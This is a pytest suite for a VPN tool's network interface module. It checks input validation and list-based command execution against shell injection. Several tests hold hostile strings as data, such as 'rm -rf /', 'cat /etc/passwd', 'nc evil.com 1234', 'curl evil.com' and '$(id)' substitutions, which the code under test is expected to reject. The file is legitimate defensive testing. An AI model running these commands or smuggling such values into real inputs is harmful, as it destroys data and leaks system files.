"""Comprehensive tests for network interface management.

This test suite validates the security fixes in the network/interfaces.py module,
particularly the prevention of command injection through interface names.
"""

import pytest
from vpnhd.network.interfaces import NetworkInterface
from vpnhd.exceptions import ValidationError


class TestNetworkInterfaceValidation:
    """Test input validation in NetworkInterface class (CRITICAL for security)."""

    def test_valid_interface_name_accepted(self, mocker, valid_interface_names):
        """Test that valid interface names are accepted."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        for interface in valid_interface_names:
            ni = NetworkInterface(interface)
            # Should not raise ValidationError
            assert ni.interface == interface

    def test_invalid_interface_name_rejected(self, invalid_interface_names):
        """Test that invalid interface names are rejected."""
        for interface in invalid_interface_names:
            with pytest.raises(ValidationError) as exc_info:
                ni = NetworkInterface(interface)

            assert "interface" in str(exc_info.value).lower()

    def test_injection_attempts_rejected(self):
        """Test that command injection attempts are rejected."""
        dangerous_names = [
            "eth0; rm -rf /",
            "eth0 && cat /etc/passwd",
            "eth0|nc evil.com 1234",
            "eth0`whoami`",
            "eth0$(id)",
            "../../../etc/passwd",
        ]

        for dangerous in dangerous_names:
            with pytest.raises(ValidationError):
                NetworkInterface(dangerous)

    def test_empty_interface_name_rejected(self):
        """Test that empty interface name is rejected."""
        with pytest.raises(ValidationError):
            NetworkInterface("")

    def test_too_long_interface_name_rejected(self):
        """Test that interface names longer than 15 chars are rejected."""
        # 16 characters - exceeds IFNAMSIZ limit
        with pytest.raises(ValidationError):
            NetworkInterface("a" * 16)


class TestBringInterfaceUp:
    """Test bring_interface_up method."""

    def test_bring_up_success(self, mocker):
        """Test successfully bringing interface up."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        result = ni.bring_interface_up()

        assert result is True

        # Verify correct command was used
        call_args = mock_cmd.call_args_list
        # Should use array format: ["ip", "link", "set", "eth0", "up"]
        assert any("ip" in str(call[0]) for call in call_args)
        assert any("link" in str(call[0]) for call in call_args)

    def test_bring_up_failure(self, mocker):
        """Test failure when bringing interface up."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=False, exit_code=1, stdout="", stderr="error")

        ni = NetworkInterface("eth0")
        result = ni.bring_interface_up()

        assert result is False

    def test_bring_up_uses_array_command(self, mocker):
        """Test that bring_up uses array-based command (secure)."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("wg0")
        ni.bring_interface_up()

        # Verify execute_command was called with list, not f-string
        call_args = mock_cmd.call_args
        assert isinstance(call_args[0][0], list), "Should use array format, not f-string"


class TestBringInterfaceDown:
    """Test bring_interface_down method."""

    def test_bring_down_success(self, mocker):
        """Test successfully bringing interface down."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        result = ni.bring_interface_down()

        assert result is True

    def test_bring_down_uses_array_command(self, mocker):
        """Test that bring_down uses array-based command (secure)."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("wg0")
        ni.bring_interface_down()

        # Verify array format
        call_args = mock_cmd.call_args
        assert isinstance(call_args[0][0], list)


class TestSetIPAddress:
    """Test set_ip_address method."""

    def test_set_ip_valid_ipv4(self, mocker, valid_ip_addresses):
        """Test setting valid IPv4 addresses."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")

        for ip in valid_ip_addresses[:5]:  # Test a few
            result = ni.set_ip_address(ip, "24")
            assert result is True

    def test_set_ip_invalid_ip_rejected(self, mocker, invalid_ip_addresses):
        """Test that invalid IP addresses are rejected."""
        ni = NetworkInterface("eth0")

        for ip in invalid_ip_addresses[:5]:  # Test a few
            with pytest.raises(ValidationError) as exc_info:
                ni.set_ip_address(ip, "24")

            assert "ip" in str(exc_info.value).lower()

    def test_set_ip_valid_netmask(self, mocker, valid_netmasks):
        """Test setting IP with valid netmasks."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")

        for netmask in valid_netmasks[:5]:  # Test a few
            result = ni.set_ip_address("192.168.1.1", netmask)
            assert result is True

    def test_set_ip_invalid_netmask_rejected(self, mocker):
        """Test that invalid netmasks are rejected."""
        ni = NetworkInterface("eth0")

        invalid_netmasks = ["33", "99", "-1", "invalid", "255.0.255.0"]

        for netmask in invalid_netmasks:
            with pytest.raises(ValidationError) as exc_info:
                ni.set_ip_address("192.168.1.1", netmask)

            assert "netmask" in str(exc_info.value).lower()

    def test_set_ip_uses_array_command(self, mocker):
        """Test that set_ip_address uses array-based command."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        ni.set_ip_address("192.168.1.1", "24")

        # Verify array format
        call_args = mock_cmd.call_args
        assert isinstance(call_args[0][0], list)

    def test_set_ip_injection_attempt_blocked(self, mocker):
        """Test that IP injection attempts are blocked."""
        ni = NetworkInterface("eth0")

        malicious_ips = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && cat /etc/passwd",
            "192.168.1.1|nc evil.com",
        ]

        for malicious in malicious_ips:
            with pytest.raises(ValidationError):
                ni.set_ip_address(malicious, "24")


class TestAddRoute:
    """Test add_route method."""

    def test_add_route_success(self, mocker):
        """Test adding route successfully."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        result = ni.add_route("192.168.2.0/24", "192.168.1.1")

        assert result is True

    def test_add_route_invalid_destination_rejected(self, mocker):
        """Test that invalid destination is rejected."""
        ni = NetworkInterface("eth0")

        with pytest.raises(ValidationError):
            ni.add_route("invalid_cidr", "192.168.1.1")

    def test_add_route_invalid_gateway_rejected(self, mocker):
        """Test that invalid gateway is rejected."""
        ni = NetworkInterface("eth0")

        with pytest.raises(ValidationError):
            ni.add_route("192.168.2.0/24", "invalid_ip")

    def test_add_route_uses_array_command(self, mocker):
        """Test that add_route uses array-based command."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        ni.add_route("192.168.2.0/24", "192.168.1.1")

        # Verify array format
        call_args = mock_cmd.call_args
        assert isinstance(call_args[0][0], list)

    def test_add_route_injection_blocked(self, mocker):
        """Test that route injection attempts are blocked."""
        ni = NetworkInterface("eth0")

        # Malicious destination
        with pytest.raises(ValidationError):
            ni.add_route("192.168.2.0/24; rm -rf /", "192.168.1.1")

        # Malicious gateway
        with pytest.raises(ValidationError):
            ni.add_route("192.168.2.0/24", "192.168.1.1 && malware")


class TestDeleteRoute:
    """Test delete_route method."""

    def test_delete_route_success(self, mocker):
        """Test deleting route successfully."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        result = ni.delete_route("192.168.2.0/24")

        assert result is True

    def test_delete_route_invalid_destination_rejected(self, mocker):
        """Test that invalid destination is rejected."""
        ni = NetworkInterface("eth0")

        with pytest.raises(ValidationError):
            ni.delete_route("invalid_cidr")

    def test_delete_route_uses_array_command(self, mocker):
        """Test that delete_route uses array-based command."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        ni.delete_route("192.168.2.0/24")

        # Verify array format
        call_args = mock_cmd.call_args
        assert isinstance(call_args[0][0], list)


class TestFlushInterface:
    """Test flush_interface method."""

    def test_flush_success(self, mocker):
        """Test flushing interface successfully."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        result = ni.flush_interface()

        assert result is True

    def test_flush_uses_array_command(self, mocker):
        """Test that flush uses array-based command."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        ni.flush_interface()

        # Verify array format
        call_args = mock_cmd.call_args
        assert isinstance(call_args[0][0], list)


class TestGetInterfaceStats:
    """Test get_interface_stats method."""

    def test_get_stats_success(self, mocker):
        """Test getting interface stats successfully."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(
            success=True, exit_code=0, stdout="RX bytes: 1000 TX bytes: 2000", stderr=""
        )

        ni = NetworkInterface("eth0")
        stats = ni.get_interface_stats()

        assert stats is not None

    def test_get_stats_uses_array_command(self, mocker):
        """Test that get_stats uses array-based command."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="stats", stderr="")

        ni = NetworkInterface("eth0")
        ni.get_interface_stats()

        # Verify array format
        call_args = mock_cmd.call_args
        assert isinstance(call_args[0][0], list)


class TestEnableIPForwarding:
    """Test enable_ip_forwarding method."""

    def test_enable_ipv4_forwarding(self, mocker):
        """Test enabling IPv4 forwarding."""
        # Mock FileManager methods
        mock_file_manager = mocker.patch("vpnhd.network.interfaces.FileManager")
        mock_instance = mocker.Mock()
        mock_file_manager.return_value = mock_instance
        mock_instance.write_file.return_value = True

        ni = NetworkInterface("eth0")
        result = ni.enable_ip_forwarding()

        assert result is True

        # Verify file write was called for IPv4
        mock_instance.write_file.assert_called()

    def test_enable_ipv6_forwarding(self, mocker):
        """Test enabling IPv6 forwarding."""
        mock_file_manager = mocker.patch("vpnhd.network.interfaces.FileManager")
        mock_instance = mocker.Mock()
        mock_file_manager.return_value = mock_instance
        mock_instance.write_file.return_value = True

        ni = NetworkInterface("eth0")
        result = ni.enable_ip_forwarding(ipv6=True)

        assert result is True

        # Verify IPv6 path was used
        mock_instance.write_file.assert_called()

    def test_enable_forwarding_no_shell_pipes(self, mocker):
        """Test that IP forwarding doesn't use shell pipes (security fix)."""
        mock_file_manager = mocker.patch("vpnhd.network.interfaces.FileManager")
        mock_instance = mocker.Mock()
        mock_file_manager.return_value = mock_instance
        mock_instance.write_file.return_value = True

        # Mock execute_command to ensure it's not used with pipes
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")

        ni = NetworkInterface("eth0")
        ni.enable_ip_forwarding()

        # Should use FileManager, not echo with pipes
        mock_instance.write_file.assert_called()

        # If execute_command is called, verify no shell pipes
        if mock_cmd.called:
            for call in mock_cmd.call_args_list:
                command = call[0][0]
                if isinstance(command, str):
                    assert "|" not in command
                    assert "echo" not in command.lower() or ">" not in command


class TestInterfaceExists:
    """Test interface_exists method."""

    def test_interface_exists_true(self, mocker):
        """Test checking for existing interface."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(
            success=True, exit_code=0, stdout="eth0: <BROADCAST,MULTICAST,UP>", stderr=""
        )

        ni = NetworkInterface("eth0")
        result = ni.interface_exists()

        assert result is True

    def test_interface_exists_false(self, mocker):
        """Test checking for non-existent interface."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(
            success=False, exit_code=1, stdout="", stderr="does not exist"
        )

        ni = NetworkInterface("eth0")
        result = ni.interface_exists()

        assert result is False


class TestGetIPAddress:
    """Test get_ip_address method."""

    def test_get_ip_success(self, mocker):
        """Test getting IP address successfully."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(
            success=True, exit_code=0, stdout="inet 192.168.1.100/24", stderr=""
        )

        ni = NetworkInterface("eth0")
        ip = ni.get_ip_address()

        assert ip is not None
        # Parsing logic depends on implementation

    def test_get_ip_no_address(self, mocker):
        """Test getting IP when none assigned."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(
            success=True, exit_code=0, stdout="no address", stderr=""
        )

        ni = NetworkInterface("eth0")
        ip = ni.get_ip_address()

        # Should handle gracefully (return None or empty)


class TestCommandInjectionPrevention:
    """Comprehensive injection prevention tests for NetworkInterface."""

    @pytest.mark.parametrize(
        "malicious_interface",
        [
            "eth0; rm -rf /",
            "eth0 && cat /etc/passwd",
            "eth0|nc evil.com 1234",
            "eth0`whoami`",
            "eth0$(id)",
            "../../../etc/passwd",
            "'; DROP TABLE interfaces; --",
        ],
    )
    def test_all_methods_reject_malicious_interface(self, malicious_interface):
        """Test that malicious interface names are rejected by all methods."""
        with pytest.raises(ValidationError):
            NetworkInterface(malicious_interface)

    def test_set_ip_with_valid_interface_malicious_ip(self, mocker):
        """Test that malicious IP is rejected even with valid interface."""
        ni = NetworkInterface("eth0")

        malicious_ips = [
            "192.168.1.1; reboot",
            "192.168.1.1 && curl evil.com",
            "$(whoami)",
        ]

        for malicious_ip in malicious_ips:
            with pytest.raises(ValidationError):
                ni.set_ip_address(malicious_ip, "24")

    def test_add_route_with_malicious_inputs(self, mocker):
        """Test that add_route rejects all malicious inputs."""
        ni = NetworkInterface("eth0")

        # Malicious destination
        with pytest.raises(ValidationError):
            ni.add_route("192.168.0.0/24; malware", "192.168.1.1")

        # Malicious gateway
        with pytest.raises(ValidationError):
            ni.add_route("192.168.0.0/24", "192.168.1.1; malware")

    def test_no_f_strings_in_commands(self, mocker):
        """Test that no f-strings are used in command execution."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")

        # Execute various methods
        ni.bring_interface_up()
        ni.bring_interface_down()
        ni.set_ip_address("192.168.1.1", "24")
        ni.add_route("192.168.2.0/24", "192.168.1.1")
        ni.delete_route("192.168.2.0/24")
        ni.flush_interface()

        # Verify all calls use list format
        for call in mock_cmd.call_args_list:
            command = call[0][0]
            assert isinstance(command, list), f"Command should be list, got: {type(command)}"


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_interface_name_max_length(self, mocker):
        """Test interface name at maximum length (15 characters)."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        # Exactly 15 characters (IFNAMSIZ limit)
        ni = NetworkInterface("a" * 15)
        assert ni.interface == "a" * 15

    def test_interface_name_one_over_max(self):
        """Test interface name just over maximum length."""
        # 16 characters - should fail
        with pytest.raises(ValidationError):
            NetworkInterface("a" * 16)

    def test_special_characters_in_valid_interface(self, mocker):
        """Test valid special characters in interface names."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        valid_interfaces = ["eth0", "eth-0", "eth_0", "eth.0"]

        for interface in valid_interfaces:
            ni = NetworkInterface(interface)
            assert ni.interface == interface

    def test_unicode_in_interface_name_rejected(self):
        """Test that unicode characters are rejected."""
        with pytest.raises(ValidationError):
            NetworkInterface("eth🔥")

    def test_whitespace_in_interface_name_rejected(self):
        """Test that whitespace is rejected."""
        with pytest.raises(ValidationError):
            NetworkInterface("eth 0")

    def test_ip_address_edge_cases(self, mocker):
        """Test IP address edge cases."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")

        # Valid edge cases
        assert ni.set_ip_address("0.0.0.0", "0") is True
        assert ni.set_ip_address("255.255.255.255", "32") is True

        # Invalid edge cases
        with pytest.raises(ValidationError):
            ni.set_ip_address("256.1.1.1", "24")

    def test_netmask_cidr_range(self, mocker):
        """Test netmask CIDR range validation."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")

        # Valid CIDR range: 0-32
        for cidr in [0, 1, 16, 24, 31, 32]:
            result = ni.set_ip_address("192.168.1.1", str(cidr))
            assert result is True

        # Invalid CIDR
        with pytest.raises(ValidationError):
            ni.set_ip_address("192.168.1.1", "33")

        with pytest.raises(ValidationError):
            ni.set_ip_address("192.168.1.1", "-1")
